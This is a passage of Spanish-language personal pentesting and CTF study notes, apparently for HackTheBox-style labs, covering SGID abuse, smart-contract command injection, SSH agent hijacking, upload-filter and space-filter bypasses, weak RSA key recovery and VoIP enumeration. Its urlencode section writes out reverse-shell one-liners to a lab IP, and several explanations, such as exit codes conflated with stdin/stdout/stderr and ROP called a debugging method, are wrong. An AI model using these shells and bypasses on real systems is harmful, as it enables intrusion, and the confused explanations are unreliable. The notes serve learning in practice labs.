^C
jump winner
```
**Otra tecnica es pasarle al binario**

`string -e l pepe.exe | grep flag`

#Te reporta informacion adicional.

## ROP

Es programming oriented return un metodo utilizado para 
el debbuging que mediante la busqueda de gadgets en un 
binario de 64 bits. Puedes sacar las direcciones de system
exit etc..

## Rutas de sistema

APT

`sudo nano /etc/apt/sources.list`

En esta ruta se tramitan los los repositorios de debian 
contenido:

```conf
deb http://http.kali.org/kali kali-rolling main contrib non-free
# For source package access, uncomment the following line
# deb-src http://http.kali.org/kali kali-rolling main contrib non-free
deb http://http.kali.org/kali sana main non-free contrib
deb http://security.kali.org/kali-security sana/updates main contrib non-free
# For source package access, uncomment the following line
# deb-src http://http.kali.org/kali sana main non-free contrib
# deb-src http://security.kali.org/kali-security sana/updates main contrib non-free
deb http://old.kali.org/kali moto main non-free contrib
# For source package access, uncomment the following line
# deb-src http://old.kali.org/kali moto main non-free contrib
```

**crontab**

/etc/cron.d

rutas del sistema almacena diversos scripts que se autoejecutan 
son crontabs, con lo cual es una buena ruta para crear un script
que sera ejecutado por un usuario.

**arquitectura**

/etc/os-release 

Es una ruta del sistema que te muestra la arquitectura de la maquina.


## salt

El salt es una clave secreta que en utilizan las contraseñas
hasheadas, estos salt también se pueden encontrar en la base de
datos, aunque esto último no es comón, lo común es simplemente
encontrar la contraseña hasheada. 
Pero ya se ha visto en multiples exploits que se pide el salt
de una contraseña hasheada. Porque en caso de no tenerlo no 
seria capaz de romperla.
En estos ultimos casos es muy probable que si filtre el salt en la
base de datos.



Para mayor seguridad, el valor de sal se guarda en secreto,
separado de la base de datos de contraseñas. 
Esto aporta una gran ventaja cuando la base de datos es 
robada, pero la sal no. Para determinar una contraseña a 
partir de un hash robado, el atacante no puede simplemente 
probar contraseñas comunes (como palabras del idioma inglés o 
nombres), sino calcular los hashes de caracteres aleatorios 
(al menos la porción de la entrada que se sabe es la sal), lo 
que es mucho más lento. 

## sctp

Stream Control Transmission Protocol es un protocolo de comunicación de capa de transporte que fue definido por el grupo SIGTRAN de IETF en el año 2000. El protocolo está especificado en la RFC 2960, y la RFC 3286 brinda una introducción al mismo.
Se usa para redes de telefonia 
No se suele utilizar para exponer servicios sin embargo para ver 
los servicios que estan corriendo en los puertos open, tenemos que 
hacer socat con nuestros propios puertos. 

ex: nuestro 80 con su 80 ahora tendrias que tirar de tu propio localhost

Para descubirlo usamos -sY en nmap

## serializacion

La serializacion como concepto, es una tecnica medioante la cual se 
asegura que el envio de datos no pueda ser ofesivo gracias a que se 
transforma en el viaje segun los parametros que esten configurados por 
detras en el servidor. Las serializaciones son distintas y ademas 
dependen de cada lenguaje de programacion que se use para la misma.

En ciencias de la computación, la serialización consiste en un proceso 
de codificación de un objeto en un medio de almacenamiento con el 
fin de transmitirlo a través de una conexión en red como una serie 
de bytes o en un formato humanamente más legible como XML o JSON, 
entre otros.
Pero realmente se puede serializar en muchos mas lenguajes.

## Set-Cookie

Una buena tencnica de descubrir rutas ocultas o informacion
que no se nos permite ver. Es quitando parametros de cabeceras
por ejemplo si tienes 3 cookies quitar una y lo mismo se te muestra 
informacion.

Esto se debe a que en la mayoria de pasos te va a obligar en la respuesta
o mejor dicho en la respuesta se va ha setear la cookie de manera automacica
de tal manera que podrias hacer algo con privilegios desconocidos.

## sgid

Estos permisos te dejarian ejecutar
un archivo como el grupo que este asignado en 
ese archivo claro que tienes que tebner permisos 
de ejecucion, en caso de que ese comando
te permita usar multiples comandos podrias 
conseguir asignarte el grupo que tiene el comando
al usuario en el que estas situado.

Puesde usar un comando temporalmente con el grupo que
tiene asignado. En caso de que ese comando te permita obtener
una shell podremos secuestrar el grupo.

```bash
find / -perm -2000 2>/dev/null
```
## SmartContract

Un smart contract en cualquier blockchain se basa en un código que 
determinada unas acciones y un conjunto de claves públicas. Se deben
dar al menos dos claves públicas, la del creador del contrato inteligente 
y la del propio contrato, que hace el papel de identificador único.

Una manera de identificar cuando se esta realizando un smart contract
es con dos archivos uno .json y otro .sol en el archivo .json tiene
una parte que pone contract o contractName el caso esque hace referencia 
a un contrato entonces sabras que es un smart contract.

Si vemos solc o solidity es una extension y version de archivos que 
funcionan como smart contract para ethereum, para que se realize este
smart contract es necesario saber la direccion de destino y el ABI
el abi se suele encontrar en el archivo json como cont

Lo mejor es no crear el script y meterte en un interprete de python porque este "script" actua como una consola, a la que le pedimos consultas continuamente.

```python
#!/usr/bin/python3
from web3 import Web3, eth
import json
address = '0x6Ef4c150e2A89C30F84461AB8Fcae4DF79f0276B'
web3 = Web3(Web3.HTTPProvider("http://10.10.10.142:9810"))

#Al poner web3 como el nombre que definimos en las variables te saldra un offset entonces si funciona
web3  

#Si usamos web3.eht y doble escape vemos lo que podemos listar.
web.eth "g		escape" "escape"
web3.eth.accounts #Con esto veremos todas las cuentas y elegiremos una de ellas para usar 
#['0x955b59c9Cd437A39C915Cb27765F7208bDFF5f04', '0x517b03ED86EE22F628e4F8C23704552762C452c7', '0x421b41d>

web3.eth.accounts[0] #Con esto nos quedamos con la primera 
#'0x955b59c9Cd437A39C915Cb27765F7208bDFF5f04'  

web3.eth.defaultAcc = web3.eth.accounts[0] # Y la primera la almacenamos en una variable 

json_file = json.loads(open("WeaponizedPing.json", 'r').read()) #Leemos el archivo en json

json_file['abi'] # Veremos el parametro abi del archivo json que almacenamos en open

abi = json_file['abi'] # almacenamos en una variable el valor de abi
contract = web3.eth.contract(address=address, abi=abi) #Definimos el contract es te tenemos que pasar el addres que ya definimos arriba y el abi. Ironicamente los argumentos se llaman como las variables.
##Ya podemos hacer uso de las funciones del archivo .json de la siguiente manera:
contract.functions.getDomain().call() #Las funciones se encuentran en el archivo json.
contract.functions.setDomain("pornhub.com").transact()
```
Se le indica transact cuando quieras hacer un cambio y call cuando quieras verlo.
La gracia de esto esta en que en el setDomain si pones ; de tras puedes ejecutar comandos.

## SSH-agente

Los agentes son una forma de identificar temporalmente 
una sesion de ssh, si vemos un directorio con nombre
ssh-f32if9nfmfe2fke... # Probablemente dentro haiga un agent.412 

Si definimos lo siguiente en la variable ↓↓ nos conectaria de forma automatica↓↓↓↓↓
SSH_AUTH_SOCK=agent.412 ssh root@10.10.10.10 

## std

stder 2

stdin 0

stdout 1

2>&1 redirige a stdout

Existen varios codigos de estado en el sistema 
indentificados por numeros 
0 stedin # salida exitosa
1 stedout # salida no exitosa
2 stederr #errores

Estos codigos son muy utiles para jugar con las redirecciones 
2>/dev/null #Mandamos todo el stedeer al dev null, el stederr hace mencion a los errores

tambien podemos jugar con 

&>/dev/null # de esta manera mandamos los 3 codigos al dev null

otra redireccion muy eficiente es para convertir uno de estos tipos de codigo en otro

2>&1 #De esta manera convertimos el stederr en stedout. Es vale para cuando un comando
no es capaz de identificar el stederr, pero si el stedour. Por ejemplo grep -v 

tambien existen otros codigos como el 127 etc ...

## str

strcmp
Este manipulador de codigo tiene como funcion comparar strings con las 
palabras que tu le pongas al binario en el que este introducido . Es decir
si tu utilizas ltrace sobre un binario y ves strcmp(hola , pepito) es por que
para que el flujo del programa funcione tu tienes que poner lo que viene hay.


libreria c
compara cadenas.

## subdomains

un subdominio es un dominio de nivel 3. 
Un subdominio es una extensión del nombre de dominio que se utiliza para organizar diferentes secciones de una web  
existe una ruta en el sistema /etc/nginx/sites-available/ que te muestra los subdominios y su información

## superglobals

Todas estas variables predefinidas son superglobals entre paginas si quieres saber si se esta tramitando algo en realidad y no es una pagina 
falsa o que no tiene contenido puedes ver el codigo fuente de estas y grepear por una superglobal .
    $GLOBALS
    $_SERVER
    $_GET
    $_POST
    $_FILES
    $_COOKIE
    $_SESSION
    $_REQUEST
    $_ENV

## text2speech

Cuando una pagina te pide que envies un fichero o escribas una palabra 
esta palabra se traducira a texto con lo cual puedes poner contenido en
sqli. 
como:
its or one equals one comment 

its le pondra coma para traducirlo y se producira el error de sintaxis de
sql. 
formatos: wav y mp3 por ejemplo.

## typeFile

En base a modificar los magic numbers podemos engañar la tramitacion de una pagina web sobre un upload file

Hay veces que cuando abusas de un upload file con un archivo .php.png no te lo detecta aunque tu sepas que se esta validando con png
y esto es por que se fija en los magic number del archivo podemos manipular esto si ponemos en la cabezera del archivo GIF8;

## urlencode

cuando tengas que hacer una peticion a una pagina web procura
que el contenido este encodeado en base 64 de esta maneara lo 
puede entender.

Ten en cuenta que al urlencode no le gustan los + con lo cual
si lo encodeas en base64 que no tenga + ,exceptuando que no lo
haigas encodedado , si no lo encodeas los mas significan espacio

**Ej:**

```bash
bash -i >& /dev/tcp/10.10.14.40/2222 0>&1 | base64 

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC8yMjIyIDA+JjEK 
```
* _ESTA MUY MAL TIENE +_ 


```bash
bash -i &>/dev/tcp/10.10.14.40/2222 <&1 | base64

YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjQwLzIyMjIgPCYxCg==
```
* _ESTO ES PROFESIONAL_

**urlencode cheat sheet:**
```bash
%20 = espacio
"+" = espacio (burpsuite)
%26 = &
%21 = !
%23 = # 
%24 = $
```
## ValidacionEnCliente

La validacion en cliente es una manera de garantizar un envio de datos
con ciertos parametros, al igual que puedes mejorar la seguridad de cierta manera.
Se puede jugar con el codigo de html de la página para que no resuelva la 
validación a nivel de cliente. 

## vault

vault es un metodo de seguridad para acceder 
a máquinas mediante ssh, estas máquinas son 
accesibles con el código de vault, suele ser
un token.

`vault ssh root@10.10.10.10`

Te mostrara un token en el inicio de la consulta de entrada por ssh. Este es el que tendras que poner


## VOIP
Conjunto de recursos que hacen posible que la señal de voz viaje a través de Internet empleando el protocolo IP

`svwar`

Este comando te encuentra una extensión valida para poner posteriormente en un exploit o para utilizar en otra conveniencia.

Las extensiones son necesarias cuando hablamos de aplicaciones web de VOIP.

`svwar -e100-300 10.10.10.7`

En caso de que no funcione tendriamos que especificar un metodo en este caso utilzaremos INVITE

svwar -m INVITE -e100-300 10.10.10.7

## WeakRsaPQ

Es una fórmula para averiguar la clave privada mediante una clave
pequeña, lo que tenemos que hacer es averiguar el valor de n de la
clave, este valor es la multiplicacion de dos numeros primos estos 
numeros son p y q. Cuando sacas n te vas a una página como esta 
[http://factordb.com/](http://factordb.com/) para que te haye los 
dos numeros primos resultantes.

**Despues:**

Valores a sacar (e, n, d, p, q) bueno ya teniendo e n p q tenemos que
sacar d y para sacar d inventamos m = n-(p+q-1) y ponemos la función
modular multiplicativa inversa en la parte superior de nuestro script 
```python
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

#Por ultimo d = a la funcion y e, m
d = modinv(e, m)
por ultimo la construccion es 
finalkey = RSA.construct(n, e, d, p, q)
print(finalkey.exportKet())
```
Por lo general se suele resolver esto para sacar la clave privada con la 
que desencriptariamos un archivo .crypt


Otra cosa que se hacen con una debil rsa es encontrar un valor concreto
si tienes los valores p q que son los primos, suelen empezar por 7 
y ademas tenemos e, y claro en texto plano el contenido. 

[https://www.cryptool.org/en/cto/rsa-step-by-step](https://www.cryptool.org/en/cto/rsa-step-by-step)

rsactftool es una herramienta que te hace todo el trabajo

`rsactftool --publickey test.pub --private`

## webscrapping

Es la tecnica mediante la cual usas programas que 
extraen información de una pagina web, simulando la navegación
de un humano.

## Xresources

Si quieres cambiar el escalado facilmente de un tu sistema operativo
en caso de que este habilitado este archivo. Podriamos hacerlo con la 
siguiente sintaxis.

Xft.dpi: 136 #Change this

## Bypasear bloqueos de espacios 
{IFS}
Es un una funcion implementada por la terminal que te permite añadir un espacio,
para bypasear cuando no te deje ejecutar un comando con espacios.
ejemplo
echo${IFS}hola


![Octocat](https://github.githubassets.com/images/icons/emoji/octocat.png)

